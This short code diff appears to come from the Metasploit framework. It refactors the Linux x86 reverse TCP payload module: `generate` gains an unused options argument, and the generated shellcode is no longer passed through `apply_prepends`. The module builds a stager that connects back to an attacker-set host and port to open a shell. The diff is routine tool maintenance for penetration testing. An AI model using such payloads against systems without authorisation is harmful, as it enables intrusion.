@@ -18,7 +18,7 @@ module Payload::Linux::ReverseTcp_x86
   #
   # Generate the first stage
   #
-  def generate
+  def generate(_opts = {})
     conf = {
       port:          datastore['LPORT'],
       host:          datastore['LHOST'],
@@ -51,8 +51,7 @@ module Payload::Linux::ReverseTcp_x86
   #
   def generate_reverse_tcp(opts={})
     asm = asm_reverse_tcp(opts)
-    buf = Metasm::Shellcode.assemble(Metasm::X86.new, asm).encode_string
-    apply_prepends(buf)
+    Metasm::Shellcode.assemble(Metasm::X86.new, asm).encode_string
   end
 
   #
